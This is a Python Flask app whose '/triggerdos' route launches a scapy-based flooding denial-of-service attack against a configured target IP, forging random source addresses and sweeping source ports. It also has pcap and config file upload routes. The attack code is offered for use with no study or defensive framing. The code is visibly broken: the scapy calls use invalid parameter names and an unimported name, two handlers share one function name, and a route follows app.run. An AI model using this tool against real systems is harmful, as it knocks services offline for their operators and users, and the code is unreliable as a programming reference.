import os
from flask import Flask, render_template, request
from werkzeug import secure_filename
app = Flask(__name__)

import config
print (config.target_IP)

import random
from scapy.all import *
# from scapy.all import * as scapy

# from scapy.all import rdpcap
# pkts_list = rdpcap("pacp/http.cap")

def dos():
    target_IP = config.target_IP
    i = 1
    while True:
      a = str(random.randint(1,254))
      b = str(random.randint(1,254))
      c = str(random.randint(1,254))
      d = str(random.randint(1,254))
      dot = "."
      Source_ip = a + dot + b + dot + c + dot + d
        
      for source_port in range(1, 65535):
         IP1 = scapy.IP(source_IP = Source_ip, destination = target_IP)
         TCP1 = scapy.TCP(srcport = source_port, dstport = 80)
         pkt = IP1 / TCP1
         send(pkt,inter = .001)
         print ("packet sent ", i)
         i = i + 1

# @app.route('/upload')
# def upload_file():
#    return render_template('upload.html')
	
@app.route('/config_uploader', methods = ['GET', 'POST'])
def upload_file_func():
   if request.method == 'POST':
      f = request.files['file']
      f.save(secure_filename(f.filename))
      return 'config file uploaded successfully'

@app.route('/pcap_uploader', methods = ['GET', 'POST'])
def upload_file_func():
   if request.method == 'POST':
      f = request.files['file']
      f.save(secure_filename(f.filename))
      return 'pcap file uploaded successfully'
		
if __name__ == '__main__':
   app.run(debug = True)

@app.route('/triggerdos')
def triggerdos():
    dos()